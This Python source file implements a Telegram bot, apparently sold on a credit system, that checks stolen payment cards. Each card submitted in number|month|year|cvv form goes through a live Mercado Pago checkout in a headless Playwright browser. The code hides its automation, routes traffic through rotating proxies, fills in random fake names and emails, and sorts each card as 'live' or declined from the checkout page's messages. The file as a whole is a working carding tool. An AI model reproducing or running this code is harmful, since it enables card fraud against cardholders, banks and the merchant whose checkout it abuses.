import asyncio
import random
import logging
import time
from pyrogram import Client, filters
from playwright.async_api import async_playwright
from playwright._impl._errors import TimeoutError
from db.mongo_client import MongoDB

# URL para mp2
URL_MP2 = "https://www.mercadopago.com.mx/checkout/v1/subscription/redirect/103475f1-568d-4022-a9c5-0931c2d3b287/payment-option-form-v2/?preference-id=1571665962-6c623d76-ab39-4a52-b1d7-8e0ea460e709&router-request-id=23130fb4-9506-4a9d-8a8c-6f3852eea534&p=b50ede4969bfe088d84427cf433d77d2"

def random_name():
    first_names = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura", "Jose", "Carmen"]
    last_names = ["Perez", "Garcia", "Rodriguez", "Lopez", "Martinez", "Gonzalez", "Hernandez", "Fernandez"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def random_correo():
    name = ["Juksjdklaan", "Maaksdjhkahjria", "Caraskjdhakhjlos", "Anaskjdhkaa", "Luisakdjals", "askjjjdak", "aslkd123alsd", "mzxnfcada", "sakdaksdjl1231a", "ksajdas91238", "aslkdja91023lkadjla", "laskdja192", "mariasak121", "asdjklao91kasi1", "skadka1898", "asdnasdmn1"]
    number = ["1asdsaa1", "8asssd2", "62jdsas", "02ssd11s", "71sdas21", "81ssdas2", "71sdas12", "1asdaa1112", "91sfffd921", "17sds231", "12sd8371", "asjdaj12831", "aksjda121", "kasuda1212z", "aksuda12", "aisudi121"]
    correo = ["@gmail.com", "@outlook.com", "@yahoo.com", "@hotmail.com"]
    return f"{random.choice(name)}{random.choice(number)}{random.choice(correo)}"

def get_proxy():
    try:
        with open('srca/proxy.txt', 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        if not proxies:
            raise ValueError("El archivo proxy.txt está vacío o no contiene proxies válidos.")
        proxy_str = random.choice(proxies)
    except FileNotFoundError:
        print("Error: No se encontró el archivo proxy.txt")
        return None
    except Exception as e:
        print(f"Error al leer proxy.txt: {str(e)}")
        return None

    user_pass, ip_port = proxy_str.split('@')
    username, password = user_pass.split('://')[1].split(':')
    server = f"http://{ip_port}"
    proxy = {
        "server": server,
        "username": username,
        "password": password
    }
    print(f"Usando proxy: {proxy_str}")
    return proxy

async def process_payment(card_number, exp_month, exp_year, cvv):
    proxy = get_proxy()
    async with async_playwright() as p:
        try:
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-extensions'
                ]
            )
            context_args = {
                'viewport': {'width': 1920, 'height': 1080},
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'ignore_https_errors': True
            }
            if proxy:
                context_args['proxy'] = {
                    'server': proxy['server'],
                    'username': proxy['username'],
                    'password': proxy['password']
                }
            context = await browser.new_context(**context_args)
            page = await context.new_page()
            
            # Configurar timeout más largo
            page.set_default_timeout(120000)  # 2 minutos
            
            try:
                await page.goto(URL_MP2, wait_until='load', timeout=120000)
            except Exception as e:
                print(f"Error al cargar la página inicial: {str(e)}")
                await browser.close()
                return "<b>⛔ RECHAZADO ⛔</b>", f"<b>ERROR AL CARGAR PÁGINA: {str(e)}</b>", "bad"

            try:
                # Esperar y hacer clic en el botón de nueva tarjeta
                await page.wait_for_selector('.payment-method-logo.new_card_row', timeout=30000)
                await page.click('.payment-method-logo.new_card_row')
                await page.wait_for_timeout(2000)

                # Llenar el nombre
                await page.fill('input[placeholder="Ej.: María López"]', random_name())
                await page.wait_for_timeout(2000)
                
                # Esperar a que los iframes estén disponibles
                await page.wait_for_selector('iframe[name="cardNumber"]', timeout=30000)
                await page.wait_for_selector('iframe[name="expirationDate"]', timeout=30000)
                await page.wait_for_selector('iframe[name="securityCode"]', timeout=30000)
                
                card_number_frame = page.frame(name="cardNumber")
                expiration_date_frame = page.frame(name="expirationDate")
                security_code_frame = page.frame(name="securityCode")

                if not all([card_number_frame, expiration_date_frame, security_code_frame]):
                    raise Exception("No se pudieron cargar los iframes de la tarjeta")

                # Llenar los datos de la tarjeta
                await card_number_frame.fill('input[name="cardNumber"]', card_number)
                await page.wait_for_timeout(2000)
                await expiration_date_frame.fill('input[name="expirationDate"]', f"{exp_month}/{exp_year[-2:]}")
                await page.wait_for_timeout(2000)
                await security_code_frame.fill('input[name="securityCode"]', cvv)
                await page.wait_for_timeout(2000)

                # Hacer clic en continuar
                await page.click('button:has-text("Continuar")')
                await page.wait_for_load_state('load')
                await page.wait_for_timeout(3000)
                
                # Intentar diferentes selectores para el botón 3D
                try:
                    selectors_3d = [
                        'text="3 de"',
                        'text="3D"',
                        'text="3D Secure"',
                        'button:has-text("3")',
                        'button:has-text("3D")',
                        'button:has-text("3 de")'
                    ]
                    
                    for selector in selectors_3d:
                        try:
                            if await page.locator(selector).count() > 0:
                                await page.locator(selector).click(timeout=5000)
                                print(f"Botón 3D encontrado con selector: {selector}")
                                break
                        except Exception as e:
                            print(f"No se pudo hacer clic con selector {selector}: {str(e)}")
                            continue
                except Exception as e:
                    print(f"No se pudo interactuar con el botón 3D: {str(e)}")
                
                # Intentar llenar el email
                try:
                    email_selectors = [
                        'input[type="email"]',
                        'input[name="email"]',
                        'input[placeholder*="email"]',
                        'input[placeholder*="correo"]',
                        'label:has-text("E-mail") input',
                        'label:has-text("Email") input'
                    ]
                    
                    for selector in email_selectors:
                        try:
                            if await page.locator(selector).count() > 0:
                                await page.locator(selector).click()
                                await page.locator(selector).fill(random_correo())
                                print(f"Email encontrado con selector: {selector}")
                                break
                        except Exception as e:
                            print(f"No se pudo interactuar con selector de email {selector}: {str(e)}")
                            continue
                except Exception as e:
                    print(f"No se pudo interactuar con el campo email: {str(e)}")

                # Hacer clic en pagar
                await page.click('button:has-text("Pagar")')
                await page.wait_for_load_state('load')
                await page.wait_for_timeout(5000)

                # Esperar por cualquiera de los mensajes de respuesta
                selectors = [
                    'span:has-text("¡Listo! Tu pago ya se acreditó")',
                    'span:has-text("Tu tarjeta rechazó el pago")',
                    'span:has-text("Rechazamos tu pago con tarjeta")',
                    'span:has-text("Para autorizar, accede a la app de tu banco")',
                    'span:has-text("Tu Visa terminada en")',
                    'span:has-text("Tu Mastercard terminada en")',
                    'span:has-text("Tu Visa Débito terminada en")',
                    'span:has-text("Tu Mastercard Débito terminada en")',
                    'span:has-text("El número de tarjeta es")',
                    'span:has-text("El vencimiento de la tarjeta es")',
                    'span:has-text("Por motivos de seguridad")',
                    'span:has-text("La clave de la tarjeta es")',
                    'span:has-text("Tu tarjeta no está activada")',
                    '#root-app > div > div > div > div.onboarding-div-container > div > div.onboarding-text-container > span.title'
                ]

                for selector in selectors:
                    try:
                        if await page.locator(selector).count() > 0:
                            text = await page.locator(selector).text_content()
                            print(f"Respuesta encontrada: {text}")
                            break
                    except Exception as e:
                        print(f"Error al buscar selector {selector}: {str(e)}")
                        continue

                results_mapping = [
                    ('span:has-text("¡Listo! Tu pago ya se acreditó")', '<b>✔️ ¡APROBADO! PAGO ACREDITADO</b>'),
                    ('span:has-text("Tu tarjeta rechazó el pago")', '<b>TU TARJETA RECHAZÓ EL PAGO</b>'),
                    ('span:has-text("Rechazamos tu pago con tarjeta")', '<b>RECHAZAMOS TU PAGO CON TARJETA</b>'),
                    ('span:has-text("Para autorizar, accede a la app de tu banco")', '<b>AUTORIZACIÓN NECESARIA</b>'),
                    ('span:has-text("Tu Visa terminada en")', '<b>FONDOS INSUFICIENTES</b>'),
                    ('span:has-text("Tu Mastercard terminada en")', '<b>FONDOS INSUFICIENTES</b>'),
                    ('span:has-text("Tu Visa Débito terminada en")', '<b>FONDOS INSUFICIENTES</b>'),
                    ('span:has-text("Tu Mastercard Débito terminada en")', '<b>FONDOS INSUFICIENTES</b>'),
                    ('span:has-text("El número de tarjeta es")', '<b>TARJETA INVÁLIDA</b>'),
                    ('span:has-text("El vencimiento de la tarjeta es")', '<b>FECHA INVÁLIDA</b>'),
                    ('span:has-text("Por motivos de seguridad")', '<b>RECHAZADO POR SEGURIDAD</b>'),
                    ('span:has-text("La clave de la tarjeta es")', '<b>✔️ LIVE CNN - CVV INCORRECTO</b>'),
                    ('span:has-text("Tu tarjeta no está activada")', '<b>TARJETA NO ACTIVADA</b>'),
                    ('#root-app > div > div > div > div.onboarding-div-container > div > div.onboarding-text-container > span.title', '<b>3D SECURE</b>')
                ]

                status = "<b>⛔ RECHAZADO ⛔</b>"
                response = "<b>RECHAZAMOS TU PAGO CON TARJETA</b>"
                result = "bad"
                
                for selector, message in results_mapping:
                    try:
                        if await page.locator(selector).count() > 0:
                            response = message
                            if message == '<b>✔️ ¡APROBADO! PAGO ACREDITADO</b>':
                                status = "<b>✅ APROBADO ✅</b>"
                                result = "live"
                            elif message == '<b>✔️ LIVE CNN - CVV INCORRECTO</b>':
                                status = "<b>✅ LIVE CNN ✅</b>"
                                result = "live"
                            break
                    except Exception as e:
                        print(f"Error al procesar selector {selector}: {str(e)}")
                        continue
                
                await browser.close()
                return status, response, result

            except Exception as e:
                print(f"Error durante el proceso de pago: {str(e)}")
                await browser.close()
                return "<b>⚠️ ERROR ⚠️</b>", f"<b>ERROR EN PROCESO: {str(e)}</b>", "bad"

        except Exception as e:
            print(f"Error al iniciar el navegador: {str(e)}")
            return "<b>⚠️ ERROR ⚠️</b>", f"<b>ERROR DE NAVEGADOR: {str(e)}</b>", "bad"

user_locks = {}
cancel_tasks = {}  

async def limited_process_payment(card_number, exp_month, exp_year, cvv, user_id):
    if user_id not in user_locks:
        user_locks[user_id] = asyncio.Lock()
    async with user_locks[user_id]:
        return await process_payment(card_number, exp_month, exp_year, cvv)

@Client.on_message(filters.command("mp", prefixes=['.', '/', '!', '?', '*'], case_sensitive=False) & filters.private)
async def mp2_command(client, message):
    start_time = time.time()
    user_id = message.from_user.id

    if user_id in user_locks and user_locks[user_id].locked():
        await message.reply("<b>⏳ ESPERA A QUE TERMINE EL PROCESO ACTUAL</b>")
        return

    cancel_tasks[user_id] = False  
    try:
        db = MongoDB()
        user_data = db.query_user(user_id)

        if user_data is None:
            await message.reply("<b>🚫 NO TIENES CUENTA REGISTRADA</b>")
            return

        current_credits = int(float(user_data.get('credits', 0)))

        if current_credits < 1:
            await message.reply("<b>💰 NO TIENES CRÉDITOS SUFICIENTES. COMPRA MÁS.</b>")
            return

        if len(message.text.split(maxsplit=1)) < 2:
            await message.reply("<b>❌ NO SE ENCONTRÓ TARJETA</b>")
            return

        data = message.text.split(maxsplit=1)[1]
        cards_data = data.split('\n')

        if len(cards_data) > 5:
            await message.reply("<b>⚠️ SOLO SE PUEDEN PROCESAR 5 TARJETAS</b>")
            return

        if not any(card_data.strip() for card_data in cards_data):
            await message.reply("<b>📛 DATOS DE TARJETA INVÁLIDOS</b>")
            return

        status_message = await message.reply("<b>🔄 PROCESANDO TARJETAS...</b>")

        results = []
        last_text = ""
        if message.from_user is not None:
            username = getattr(message.from_user, 'username', None)

        results.append("𝘾𝙏 𝘾𝙃𝙆 // Mercado Pago\n— — — — — — — — —\n")

        for index, card_data in enumerate(cards_data):
            if cancel_tasks[user_id]:
                break

            try:
                card_number, exp_month, exp_year, cvv = card_data.split('|')
                status, response, result = await limited_process_payment(card_number, exp_month, exp_year, cvv, user_id)
                results.append(f"•CC: {card_number}|{exp_month}|{exp_year}|{cvv}\n• Status: {status}\n• Response: {response}")

                current_text = "\n".join(results)

                if current_text != last_text:
                    last_text = current_text
                    await status_message.edit_text(current_text)
            except ValueError:
                results.append(f"•CC: {card_data}\n• Status: ⛔️ ERROR ⛔️\n• Response: FORMATO INCORRECTO")
            except Exception as e:
                results.append(f"•CC: {card_data}\n• Status: ⛔️ ERROR ⛔️\n• Response: ERROR EN PROCESO")

        end_time = time.time()
        elapsed_time = end_time - start_time

        cards_processed = len(cards_data)
        new_credits = current_credits - cards_processed
        db.add_crdits(user_id, -cards_processed)

        time_message = f"\n— — — — — — — — —\n• Time: {elapsed_time:.2f} SEG\n• By: @{username}\n• Creditos: {new_credits}"
        final_text = "\n".join(results) + time_message
        await status_message.edit_text(final_text)

    except Exception as e:
        await message.reply(f"<b>⚠️ ERROR AL PROCESAR:</b> {str(e)}")

    finally:
        if user_id in user_locks:
            del user_locks[user_id]
        if user_id in cancel_tasks:
            del cancel_tasks[user_id]

@Client.on_message(filters.command("stop", prefixes=['.', '/', '!', '?', '*'], case_sensitive=False) & filters.private)
async def stop2_command(client, message):
    user_id = message.from_user.id

    if user_id in user_locks:
        if user_locks[user_id].locked():
            cancel_tasks[user_id] = True
            await message.reply("<b>🛑 EL PROCESO SE DETENDRÁ DESPUÉS DE ESTA TARJETA</b>")
        else:
            await message.reply("<b>✅ NO HAY PROGRESO ACTIVO</b>")
    else:
        await message.reply("<b>✅ NO HAY PROGRESO ACTIVO</b>")